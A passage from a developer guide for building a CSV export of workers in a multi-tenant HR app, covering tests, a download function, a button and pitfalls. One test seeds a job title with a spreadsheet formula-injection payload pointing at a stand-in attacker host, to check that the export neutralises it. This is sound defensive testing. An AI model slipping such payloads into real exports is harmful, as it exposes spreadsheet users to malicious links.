    .setHeader('Cache-Control', 'private, no-store')
    .send(csv);
});
```

`Cache-Control: no-store` because this is personal data that must not sit in a shared
cache.

**6. Contract.** Workers table:

```
| GET | `/workers/export` | staff | same filters as the list → `text/csv` attachment (max 5,000 rows) |
```

and a rule noting formula-trigger cells are prefixed with `'` and that the export is
audited as `workers.exported`.

### Tests — API

In `workers.test.ts`:

```ts
describe('GET /workers/export', () => {
  it('returns the tenant’s people as CSV, honouring filters', async () => {
    const a = await createTenant();
    const b = await createTenant();
    await createWorker(a.org.id, { firstName: 'Ada', lastName: 'Byron', countryCode: 'DE' });
    await createWorker(a.org.id, { firstName: 'Bo', lastName: 'Chan', countryCode: 'GB' });
    await createWorker(b.org.id, { firstName: 'Other', lastName: 'Tenant' });

    const res = await a.admin.get('/workers/export?countryCode=DE');

    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toMatch(/text\/csv/);
    expect(res.headers['content-disposition']).toContain('attachment');
    expect(res.text).toContain('Byron');
    expect(res.text).not.toContain('Chan');      // filtered out
    expect(res.text).not.toContain('Tenant');    // another tenant
    expect(res.text).toContain('60000.00');      // major units, not 6000000
  });

  it('neutralises a job title that looks like a formula', async () => {
    const { org, admin } = await createTenant();
    await createWorker(org.id, { jobTitle: '=HYPERLINK("http://evil.example","x")' });
    const res = await admin.get('/workers/export');
    expect(res.text).toContain(`'=HYPERLINK`);
    expect(res.text).not.toMatch(/,=HYPERLINK/);
  });

  it('is refused to workers and to anonymous callers', async () => {
    const { org } = await createTenant();
    const worker = await loginAsWorker(await createWorker(org.id));
    expect((await worker.client.get('/workers/export')).status).toBe(403);
    expect((await anonymous().get('/workers/export')).status).toBe(401);
  });

  it('writes an audit record', async () => {
    const { org, admin } = await createTenant();
    await createWorker(org.id);
    await admin.get('/workers/export');
    const logs = await db.select().from(auditLogs);
    expect(logs.map((l) => l.action)).toContain('workers.exported');
  });
});
```

### Steps — web

**7. A download function.** `apps/web/src/api/workers.ts` already imports `api` and
`saveBlob` (line 18). Add:

```ts
/** Download the people list as CSV, using the filters currently on screen. */
export async function downloadWorkersCsv(
  filters: Pick<ListWorkersQuery, 'status' | 'type' | 'countryCode' | 'search'>,
): Promise<void> {
  const params = new URLSearchParams();
  for (const [key, value] of Object.entries(filters)) {
    if (value) params.set(key, String(value));
  }
  const qs = params.toString();
  saveBlob(await api.blob(`/workers/export${qs ? `?${qs}` : ''}`), 'people.csv');
}
```

It is a plain function, not a hook: a download is a one-off action with nothing to cache.

**8. The button.** In `WorkersPage.tsx`, the header's `actions` (lines 165–169) holds one
`ButtonLink`. Wrap it in a fragment and add a button before it:

```tsx
        actions={
          <>
            <Button
              variant="secondary"
              icon={<Download className="h-4 w-4" aria-hidden />}
              loading={exporting}
              onClick={async () => {
                setExporting(true);
                try {
                  await downloadWorkersCsv({
                    search: filters.search || undefined,
                    status: filters.status,
                    type: filters.type,
                    countryCode: filters.countryCode,
                  });
                } catch (err) {
                  toast.error(err);
                } finally {
                  setExporting(false);
                }
              }}
            >
              Export CSV
            </Button>
            <ButtonLink to="/people/new" icon={<UserPlus className="h-4 w-4" aria-hidden />}>
              Hire someone
            </ButtonLink>
          </>
        }
```

Add near the top of the component: `const [exporting, setExporting] = useState(false);`
and `const toast = useToast();`. Extend the imports: `Button` and `useToast` from
`'../../components/ui'`, `Download` from `lucide-react`, `downloadWorkersCsv` from
`'../../api/workers'`, and `useState` from `react` if it is not already imported.

### Verify

```bash
(cd apps/api && npx vitest run src/lib/csv.test.ts src/modules/workers)
npx tsc -p apps/web
npm run dev    # People → filter to Germany → Export CSV → open the file
```

Open the file in a spreadsheet. Then edit a worker's job title to `=1+1`, export again,
and confirm the cell shows the text `=1+1`, not `2`.

### Pitfalls

- **Route order** — covered above; it is the classic Express mistake.
- Building CSV with `array.join(',')` and no quoting is the *other* classic mistake. A
  worker named `Lovelace, Ada` shifts every column to the right.
- The audit write is outside a transaction here because the request only *reads*
  business data. That is an accepted exception to rule 7 — say so in a comment.
- 5,000 rows are built in memory. That is fine at this size; at 500,000 you would stream.

### Stretch

Add a web test asserting that clicking Export requests
`/workers/export?countryCode=DE` when the list is filtered to Germany. Then: what should
happen when there are more than 5,000 matching workers? Silently truncating an export is
a data-integrity bug waiting for a finance team to find it.
